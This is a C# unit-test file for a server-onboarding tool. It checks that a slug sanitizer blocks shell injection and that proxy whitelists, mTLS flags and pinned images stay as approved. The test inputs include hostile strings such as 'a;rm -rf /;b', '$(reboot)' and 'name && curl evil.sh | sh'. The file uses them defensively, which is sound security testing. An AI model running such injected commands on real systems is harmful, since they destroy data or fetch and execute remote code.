using System.Text;
using Whiskers.Services.Onboarding;

namespace Whiskers.Tests;

/// <summary>W3 / C17: command-building tests for the onboarding flow (project rule: everything that
/// turns strings into shell commands gets string-assertion tests). The user-controlled input is the
/// server NAME — it must never reach a shell line except through the strict <c>Slug</c> allow-list;
/// file contents must only travel base64-encoded.</summary>
public class OnboardingCommandsTests
{
    /// <summary>R1-44 (D6): the per-host client name a new host's ghostunnel admits — the only value that changed.</summary>
    private const string HostClientCn = "whiskers-client-rabenhof-g1";

    // --- Slug: the single sanitizer between user input and the shell -----------------------------

    [Theory]
    [InlineData("Badwolf", "badwolf")]
    [InlineData("My Server 01", "my-server-01")]
    [InlineData("Über-Später!", "ber-sp-ter")]                    // non-ascii collapses, no specials survive
    [InlineData("a;rm -rf /;b", "a-rm-rf-b")]                     // injection attempt → hyphens
    [InlineData("$(reboot)", "reboot")]
    [InlineData("`whoami`", "whoami")]
    [InlineData("须弥", "server")]                                 // nothing usable → fixed fallback
    [InlineData("", "server")]
    public void Slug_is_a_strict_allow_list(string name, string expected)
        => Assert.Equal(expected, OnboardingCommands.Slug(name));

    [Theory]
    [InlineData("evil; touch /tmp/pwned")]
    [InlineData("name && curl evil.sh | sh")]
    [InlineData("name\"; reboot; \"")]
    public void Slug_output_never_contains_shell_metacharacters(string hostileName)
    {
        var slug = OnboardingCommands.Slug(hostileName);
        Assert.Matches("^[a-z0-9-]+$", slug);
    }

    // --- Host files are LF, whatever the line endings of this source checkout --------------------------

    [Fact]
    public void Generated_compose_files_contain_no_carriage_returns()
    {
        Assert.DoesNotContain('\r', OnboardingCommands.DockerProxyCompose("100.64.0.1", "whiskers-client-web-g1"));
        Assert.DoesNotContain('\r', OnboardingCommands.NodeExporterCompose("100.64.0.1"));
    }

    // --- Command builders only ever see the slug ---------------------------------------------------

    [Fact]
    public void TailscaleUp_uses_the_slug_as_hostname()
    {
        var cmd = OnboardingCommands.TailscaleUp(OnboardingCommands.Slug("My Server!"));
        Assert.Equal("sudo systemd-run --collect --unit=ts-up tailscale up --accept-dns=false --hostname=my-server", cmd);
    }

    [Fact]
    public void WriteFileB64_pipes_base64_through_tee_and_creates_the_directory()
    {
        var b64 = Convert.ToBase64String(Encoding.UTF8.GetBytes("services: {}\n"));
        var cmd = OnboardingCommands.WriteFileB64("/opt/telemetry/docker-compose.yml", b64);
        Assert.Equal($"sudo mkdir -p /opt/telemetry && echo {b64} | base64 -d | sudo tee /opt/telemetry/docker-compose.yml >/dev/null", cmd);
    }

    [Fact]
    public void WriteFileB64_content_never_appears_raw_in_the_command()
    {
        var hostile = "services:\n  x:\n    image: $(reboot)\n";
        var cmd = OnboardingCommands.WriteFileB64("/opt/x/y.yml",
            Convert.ToBase64String(Encoding.UTF8.GetBytes(hostile)));
        Assert.DoesNotContain("$(reboot)", cmd);
    }

    [Fact]
    public void AddScrapeTarget_ships_python_base64_encoded()
    {
        var cmd = OnboardingCommands.AddScrapeTargetCommand("/opt/telemetry-vm/scrape.yml", "srv-1", "100.64.0.7");
        Assert.StartsWith("echo ", cmd);
        Assert.EndsWith("| base64 -d | python3 -", cmd);
        // decode round-trip: the payload contains the ip + server id, the shell line does not
        var b64 = cmd.Split(' ')[1];
        var py = Encoding.UTF8.GetString(Convert.FromBase64String(b64));
        Assert.Contains("ip='100.64.0.7'; sid='srv-1'", py);
        Assert.DoesNotContain("100.64.0.7:9100", cmd.Replace(b64, ""));
    }

    // --- Compose templates -------------------------------------------------------------------------

    [Fact]
    public void NodeExporterCompose_binds_to_the_tailnet_ip_only()
    {
        var yml = OnboardingCommands.NodeExporterCompose("100.64.0.7");
        Assert.Contains("--web.listen-address=100.64.0.7:9100", yml);
        Assert.DoesNotContain("0.0.0.0:9100", yml);
    }

    [Fact]
    public void NodeExporterCompose_and_the_deploy_compose_read_the_textfile_collector_through_the_read_only_host_mount()
    {
        // R1-58 (contract 0005, decision 3): SMART arrives through the textfile collector; the directory is reached through
        // the existing read-only /:/host mount — no new mount, no write path on the host.
        const string flag = "--collector.textfile.directory=/host/var/lib/node_exporter/textfile_collector";
        var yml = OnboardingCommands.NodeExporterCompose("100.64.0.7");
        Assert.Contains(flag, yml);
        Assert.Contains("'/:/host:ro,rslave'", yml);
        Assert.Single(yml.Split('\n'), l => l.TrimStart().StartsWith("- '/", StringComparison.Ordinal));

        var dir = AppContext.BaseDirectory;
        while (dir is not null && !File.Exists(Path.Combine(dir, "Whiskers.slnx"))) dir = Path.GetDirectoryName(dir);
        Assert.NotNull(dir);
        var deploy = File.ReadAllText(Path.Combine(dir!, "deploy", "telemetry", "host", "docker-compose.yml"));
        Assert.Contains(flag, deploy);
        Assert.Contains("'/:/host:ro,rslave'", deploy);
    }

    [Fact]
    public void DockerProxyCompose_publishes_2376_on_the_tailnet_ip_and_keeps_dangerous_verbs_off()
    {
        var yml = OnboardingCommands.DockerProxyCompose("100.64.0.7", HostClientCn);
        Assert.Contains("'100.64.0.7:2376:2376'", yml);
        Assert.Contains("EXEC: 0", yml);
        Assert.Contains("SYSTEM: 0", yml);
        Assert.Contains("--allow-cn=" + HostClientCn, yml);
        Assert.DoesNotContain("serverwatch-client", yml);   // R1-44 (D6): a new host never admits the shared client
    }

    [Fact]
    public void The_mtls_proxy_images_rolled_out_to_hosts_are_pinned_by_digest()
    {
        // The socket proxy (verb whitelist) and ghostunnel (mTLS) are the security boundary on every onboarded host:
        // a floating tag (":latest") would change them on the next pull without review. Dependabot does not see these
        // templates, so the pin is held here.
        var yml = OnboardingCommands.DockerProxyCompose("100.64.0.7", HostClientCn);
        var images = System.Text.RegularExpressions.Regex.Matches(yml, @"image:\s*(\S+)").Select(m => m.Groups[1].Value).ToList();

        Assert.Equal(2, images.Count);
        Assert.All(images, image =>
        {
            Assert.Matches(@"^[a-z0-9./-]+:v\d+\.\d+\.\d+@sha256:[0-9a-f]{64}$", image);
            Assert.DoesNotContain(":latest", image);
        });
    }

    [Fact]
    public void The_hardened_socket_proxy_can_write_its_rendered_config()
    {
        // docker-socket-proxy renders haproxy.cfg at start (v0.4+: into /tmp); on the read-only root of the hardened
        // profile it exits unless /tmp is a tmpfs (measured: "can't create /tmp/haproxy.cfg: Read-only file system").
        var compose = DeploymentScripts.ReadRepoFile("docker-compose.hardened.yml").Replace("\r\n", "\n");
        var proxy = compose[compose.IndexOf("  socket-proxy:", StringComparison.Ordinal)..];
        var end = proxy.IndexOf("\n  serverwatch", StringComparison.Ordinal);
        if (end > 0) proxy = proxy[..end];

        Assert.Contains("read_only: true", proxy);
        // A writable tmpfs: "- /tmp" alone or with a comment, never "- /tmp:ro".
        Assert.Matches(@"tmpfs:\n(\s+- \S+.*\n)*\s+- /tmp(\s|$)", proxy);
    }

    // --- The protected boundary (socket-proxy verb whitelist, ghostunnel mTLS flags) ----------------------------------

    /// <summary>The verb whitelist, exactly — the same in the hardened profile and in the template rolled out to hosts.
    /// Changing it is a protected-area decision, so a test fails first.</summary>
    private static readonly string[] Whitelist =
    [
        "AUTH=0", "CONFIGS=0", "CONTAINERS=1", "EXEC=0", "IMAGES=1", "INFO=1", "NETWORKS=1", "PLUGINS=0", "POST=1",
        "SECRETS=0", "SWARM=0", "SYSTEM=0", "VERSION=1", "VOLUMES=1",
    ];

    [Fact]
    public void The_socket_proxy_whitelist_is_exactly_the_approved_one_in_both_places()
    {
        Assert.Equal(Whitelist, EnvironmentOf(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7", HostClientCn), "socket-proxy")));
        // The hardened profile adds exactly one entry: where the proxy listens (review of main: a Unix socket in a volume
        // shared with the app, not a loopback port every local process could reach).
        Assert.Equal(Whitelist.Append("BIND_CONFIG=" + HardenedProxyBind).Order(StringComparer.Ordinal),
            EnvironmentOf(Service(HardenedCompose(), "socket-proxy")));
    }

    private const string HardenedProxySocket = "/var/run/whiskers-proxy/docker.sock";
    private const string HardenedProxyBind = HardenedProxySocket + " mode 666";

    [Fact]
    public void The_hardened_socket_proxy_listens_on_a_socket_shared_only_with_the_app()
    {
        // Review of main: a loopback port is open to every process and host-networked container on the host, and the
        // API behind it can create containers. The proxy listens on a Unix socket in a named volume instead, which only
        // the two services mount; the app waits for the socket and is pointed at it.
        var proxy = KeysOf(Service(HardenedCompose(), "socket-proxy"));
        Assert.False(proxy.ContainsKey("ports"));
        Assert.Contains("docker-proxy:/var/run/whiskers-proxy", proxy["volumes"].Select(v => v.TrimStart('-', ' ')));
        Assert.Contains(proxy["healthcheck"], l => l.Contains("test -S " + HardenedProxySocket, StringComparison.Ordinal));

        var appBlock = Service(HardenedCompose(), "serverwatch");
        var topLevel = appBlock.IndexOf("\nvolumes:", StringComparison.Ordinal);   // the last service runs into it
        var app = KeysOf(topLevel < 0 ? appBlock : appBlock[..topLevel]);
        Assert.Contains("docker-proxy:/var/run/whiskers-proxy", app["volumes"].Select(v => v.TrimStart('-', ' ')));
        Assert.Contains("- Docker__SocketPath=unix://" + HardenedProxySocket, app["environment"]);
        Assert.Contains("condition: service_healthy", app["depends_on"]);

        // No other service mounts the socket volume.
        var mounts = HardenedCompose().Replace("\r\n", "\n").Split('\n')
            .Count(l => l.Trim().StartsWith("- docker-proxy:", StringComparison.Ordinal));
        Assert.Equal(2, mounts);
    }

    [Fact]
    public void The_boundary_services_have_exactly_the_approved_keys()
    {
        // Review round 2 (m1): an env_file, an entrypoint, a command or a second environment would reach past the pinned
        // lists, so the keys of each boundary service are pinned too.
        Assert.Equal(["container_name", "environment", "image", "restart", "volumes"],
            KeysOf(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7", HostClientCn), "socket-proxy")).Keys.Order(StringComparer.Ordinal));
        Assert.Equal(["cap_drop", "container_name", "environment", "healthcheck", "image", "read_only", "restart", "security_opt", "tmpfs", "volumes"],
            KeysOf(Service(HardenedCompose(), "socket-proxy")).Keys.Order(StringComparer.Ordinal));
        Assert.Equal(["command", "container_name", "depends_on", "image", "ports", "restart", "volumes"],
            KeysOf(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7", HostClientCn), "ghostunnel")).Keys.Order(StringComparer.Ordinal));
    }

    [Fact]
    public void The_ghostunnel_command_is_exactly_the_approved_one()
    {
        // Every item under command:, whatever its quoting (review round 2, m1): ghostunnel's allow-flags are alternatives,
        // so one more of them in any style would admit a second set of client certificates.
        var command = KeysOf(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7", HostClientCn), "ghostunnel"))["command"]
            .Select(item => Unquoted(item.StartsWith("- ", StringComparison.Ordinal) ? item[2..] : "<not a list item: " + item + ">"))
            .ToArray();

        Assert.Equal(
        [
            "server", "--listen=0.0.0.0:2376", "--target=socket-proxy:2375", "--unsafe-target", "--cert=/certs/server.crt",
            "--key=/certs/server.key", "--cacert=/certs/ca.crt", "--allow-cn=" + HostClientCn,
        ], command);
        // The rollout's preflight holds running hosts to the same list (apart from --allow-cn).
        Assert.Equal(command.Where(c => !c.StartsWith("--allow-cn=", StringComparison.Ordinal)),
            Whiskers.Services.Certificates.MtlsAllowListCommands.ApprovedArgsWithoutAllowCn);
    }

    [Theory]
    [InlineData("serverwatch-client --allow-cn=evil")]
    [InlineData("a b")]
    [InlineData("$(id)")]
    [InlineData("")]
    public void The_per_host_client_name_is_allow_listed(string cn) =>
        Assert.Throws<ArgumentException>(() => OnboardingCommands.DockerProxyCompose("100.64.0.7", cn));

    [Fact]
    public void The_templates_roll_out_the_same_images_as_the_files_dependabot_keeps_current()
    {
        // Dependabot moves the compose files, not these C# templates: a template that differs would hand new hosts an
        // older image. ghostunnel has no compose file of its own; its pin is checked by hand (deploy/README.md).
        Assert.Equal(ImageOf(Service(HardenedCompose(), "socket-proxy")),
            ImageOf(Service(OnboardingCommands.DockerProxyCompose("100.64.0.7", HostClientCn), "socket-proxy")));
        Assert.Equal(ImageOf(DeploymentScripts.ReadRepoFile("deploy", "telemetry", "host", "docker-compose.yml")),
            ImageOf(OnboardingCommands.NodeExporterCompose("100.64.0.7")));
    }

    private static string HardenedCompose() => DeploymentScripts.ReadRepoFile("docker-compose.hardened.yml");

    /// <summary>The block of one service (a two-space indented key) up to the next service.</summary>
    private static string Service(string compose, string name)
    {
        compose = compose.Replace("\r\n", "\n");
        var start = compose.IndexOf($"\n  {name}:\n", StringComparison.Ordinal);
        Assert.True(start >= 0, $"service {name} not found");
        var rest = compose[(start + 1)..];
        var next = System.Text.RegularExpressions.Regex.Match(rest[1..], @"\n  [a-z][a-z0-9-]*:\n");
        return next.Success ? rest[..(next.Index + 1)] : rest;
    }

    /// <summary>Every entry under <c>environment:</c>, as <c>KEY=value</c>. An entry in any other form (a list item, a
    /// quoted key) is kept as it is written, so it can never be skipped and the comparison fails on it.</summary>
    private static string[] EnvironmentOf(string service) =>
        KeysOf(service)["environment"].Select(line =>
            System.Text.RegularExpressions.Regex.Match(line, @"^([A-Z_]+): *(\S.*)$") is { Success: true } m
                ? $"{m.Groups[1].Value}={Unquoted(m.Groups[2].Value)}"
                : "<unexpected: " + line + ">").Order(StringComparer.Ordinal).ToArray();

    /// <summary>The keys of a service block (four-space indent) with their child lines, comments and blank lines
    /// removed. An inline value (<c>image: x</c>) is the key's one child.</summary>
    private static Dictionary<string, List<string>> KeysOf(string service)
    {
        var keys = new Dictionary<string, List<string>>(StringComparer.Ordinal);
        List<string>? current = null;
        foreach (var raw in service.Replace("\r\n", "\n").Split('\n').Skip(1))
        {
            var line = WithoutComment(raw).TrimEnd();
            if (line.Trim().Length == 0) continue;
            var key = System.Text.RegularExpressions.Regex.Match(line, @"^    ([A-Za-z_][A-Za-z0-9_]*):\s*(.*)$");
            if (key.Success)
            {
                Assert.False(keys.ContainsKey(key.Groups[1].Value), $"key {key.Groups[1].Value} appears twice");
                keys[key.Groups[1].Value] = current = [];
                if (key.Groups[2].Value.Length > 0) current.Add(key.Groups[2].Value);
            }
            else
            {
                Assert.True(current is not null && line.StartsWith("      ", StringComparison.Ordinal), $"unexpected line: {line}");
                current!.Add(line.Trim());
            }
        }
        return keys;
    }

    private static string WithoutComment(string line)
    {
        var hash = line.IndexOf(" #", StringComparison.Ordinal);
        if (line.TrimStart().StartsWith('#')) return "";
        return hash >= 0 ? line[..hash] : line;
    }

    private static string Unquoted(string value) =>
        value.Length >= 2 && (value[0] == '\'' || value[0] == '"') && value[^1] == value[0] ? value[1..^1] : value;

    private static string ImageOf(string text) =>
        System.Text.RegularExpressions.Regex.Match(text.Replace("\r\n", "\n"), @"^\s+image:\s*(\S+)",
            System.Text.RegularExpressions.RegexOptions.Multiline).Groups[1].Value;

    // --- Step metadata -----------------------------------------------------------------------------

    [Fact]
    public void Every_step_has_an_actionable_hint()
    {
        foreach (var step in Enum.GetValues<OnboardingStep>())
            Assert.False(string.IsNullOrWhiteSpace(OnboardingResult.Hint(step)));
    }
}
